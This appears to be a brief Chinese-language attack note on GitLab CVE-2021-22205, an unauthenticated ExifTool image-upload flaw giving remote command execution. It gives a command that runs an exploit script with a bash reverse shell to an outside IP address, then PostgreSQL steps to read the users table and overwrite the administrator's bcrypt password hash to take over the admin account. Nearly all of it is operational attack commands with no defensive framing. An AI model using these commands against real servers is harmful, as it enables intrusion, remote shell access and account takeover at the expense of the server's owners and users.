# Gitlab

## CVE-2021-22205

GitLab是一款Ruby开发的Git项目管理平台。在11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞[CVE-2021-22204](https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html)的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行任意命令。



```bash
python3.10 exp.py http://localhost:32780/ "bash -c 'bash -i >& /dev/tcp/121.5.169.223/39576 0>&1'"
```



## 改admin密码

查表

```postgresql
\l
\c gitlabhq_production
\dt
\x
select * from users where id = 1;
```

gitlab是用Bcrypt加密的，从网上找一个在线加密：https://www.bejson.com/encrypt/bcrpyt_encode/

改密码：

```postgresql
update users set encrypted_password='$2a$10$siuHWED6db8rb.Dp.nwmf.njgulkQPGzt0cI/ePQpJj/86a/rkzfy' where id = 1;
```

即可admin登录。